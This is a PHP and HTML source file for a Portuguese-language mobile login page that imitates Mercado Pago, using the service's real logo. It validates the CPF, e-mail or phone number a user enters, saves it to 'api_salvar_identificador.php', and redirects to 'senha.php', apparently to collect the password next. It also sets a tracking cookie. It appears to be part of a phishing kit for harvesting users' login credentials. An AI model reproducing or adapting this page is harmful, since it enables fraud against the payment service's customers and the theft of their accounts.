<?php
// Inicia a sessão para uso futuro
session_start();

// --- LÓGICA PARA CRIAR O COOKIE ---
// Verifica se o cookie 'identificador_cliente' JÁ NÃO EXISTE
if (!isset($_COOKIE['identificador_cliente'])) {
    // Se não existe, cria um ID único e seguro
    $identificadorUnico = uniqid('cliente_', true) . bin2hex(random_bytes(8));
    
    // Define o cookie para durar 30 dias, acessível em todo o site
    setcookie('identificador_cliente', $identificadorUnico, time() + (86400 * 30), "/");
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        :root {
            --cor-amarela: #ffe600;
            --cor-azul-primaria: #3483fa;
            --cor-azul-secundaria: #2968c8;
            --cor-texto-primaria: #333;
            --cor-fundo-pagina: #ededed;
            --cor-fundo-card: #fff;
        }

        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background-color: var(--cor-fundo-pagina);
        }

        .main-header {
            background-color: var(--cor-amarela);
            padding: 12px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .main-header img {
            height: 28px;
        }

        .main-content {
            background-color: var(--cor-fundo-card);
            padding: 24px;
        }

        .main-title {
            font-size: 24px;
            font-weight: 400;
            color: var(--cor-texto-primaria);
            margin: 0 0 24px 0;
        }

        .input-label {
            font-size: 14px;
            color: #555;
            margin-bottom: 4px;
            display: block;
        }

        .input-field {
            width: 100%;
            padding: 16px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 6px;
            box-sizing: border-box;
            margin-bottom: 24px;
        }

        .btn-continue {
            width: 100%;
            background-color: var(--cor-azul-primaria);
            color: white;
            border: none;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 6px;
            cursor: pointer;
            margin-bottom: 16px;
        }
        .btn-continue:hover {
            background-color: var(--cor-azul-secundaria);
        }

        .link-create {
            display: block;
            text-align: center;
            color: var(--cor-azul-primaria);
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
        }

        .support-links {
            padding: 24px;
            background-color: var(--cor-fundo-pagina);
        }

        .security-link {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background-color: var(--cor-fundo-card);
            border: 1px solid #e0e0e0;
            border-radius: 6px;
            padding: 14px 16px;
            text-decoration: none;
            color: var(--cor-texto-primaria);
            font-size: 14px;
            font-weight: 500;
        }

        .security-link .icon-text {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .help-link {
            display: block;
            margin-top: 24px;
            text-align: center;
            color: var(--cor-azul-primaria);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        
        .error-message { color: #d93025; font-size: 12px; margin-top: -16px; margin-bottom: 16px; min-height: 16px; }

    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadopago/logo__small.png" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <h1 class="main-title">Digite seu CPF, e-mail ou telefone para iniciar sessão</h1>
        <form id="mobile-login-form">
            <div>
                <label for="identificador" class="input-label">CPF, e-mail ou telefone</label>
                <input type="text" id="identificador" class="input-field" autocomplete="off">
                <div id="error-message" class="error-message"></div>
            </div>
            <button type="submit" class="btn-continue">Continuar</button>
            <a href="#" class="link-create">Criar conta</a>
        </form>
    </main>
    
    <div class="support-links">
        <a href="#" class="security-link">
            <span class="icon-text">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                <span>Tenho um problema de segurança</span>
            </span>
            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#3483fa" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
        </a>
        <a href="#" class="help-link">Preciso de ajuda</a>
    </div>

    <script>
        // A lógica de máscara, validação e envio é a mesma da index.php
        const identificadorInput = document.getElementById('identificador');
        const loginForm = document.getElementById('mobile-login-form');
        const errorDiv = document.getElementById('error-message');
        const submitBtn = loginForm.querySelector('.btn-continue');

        // FUNÇÕES DE VALIDAÇÃO
        const isValidEmail = (email) => {
            const re = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(String(email).toLowerCase());
        };
        const isValidCPF = (cpf) => {
            cpf = cpf.replace(/\D/g, '');
            if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
            let sum = 0, rest;
            for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i-1, i)) * (11 - i);
            rest = (sum * 10) % 11;
            if ((rest === 10) || (rest === 11)) rest = 0;
            if (rest !== parseInt(cpf.substring(9, 10))) return false;
            sum = 0;
            for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i-1, i)) * (12 - i);
            rest = (sum * 10) % 11;
            if ((rest === 10) || (rest === 11)) rest = 0;
            if (rest !== parseInt(cpf.substring(10, 11))) return false;
            return true;
        };
        const isValidPhone = (phone) => {
            phone = phone.replace(/\D/g, '');
            return phone.length >= 10 && phone.length <= 11;
        };

        // LÓGICA DE SUBMISSÃO
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            errorDiv.textContent = '';
            const valor = identificadorInput.value;

            if (!valor) {
                errorDiv.textContent = 'Informe seu e-mail, telefone ou CPF.';
                return;
            }
            
            let eValido = false;
            const apenasNumeros = valor.replace(/\D/g, '');

            if (valor.includes('@')) {
                eValido = isValidEmail(valor);
            } else if (apenasNumeros.length === 11) {
                eValido = isValidCPF(valor) || isValidPhone(valor);
            } else if (apenasNumeros.length === 10) {
                eValido = isValidPhone(valor);
            }

            if (!eValido) {
                errorDiv.textContent = 'Por favor, informe um dado válido.';
                return;
            }
            
            submitBtn.disabled = true;
            submitBtn.textContent = 'Aguarde...';

            try {
                const response = await fetch('api_salvar_identificador.php', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ identificador: valor })
                });
                const result = await response.json();
                if (result.success) {
                    window.location.href = 'senha.php';
                } else {
                    errorDiv.textContent = result.error || 'Ocorreu um erro.';
                }
            } catch (error) {
                errorDiv.textContent = 'Não foi possível conectar ao servidor.';
            } finally {
                submitBtn.disabled = false;
                submitBtn.textContent = 'Continuar';
            }
        });
    </script>
</body>
</html>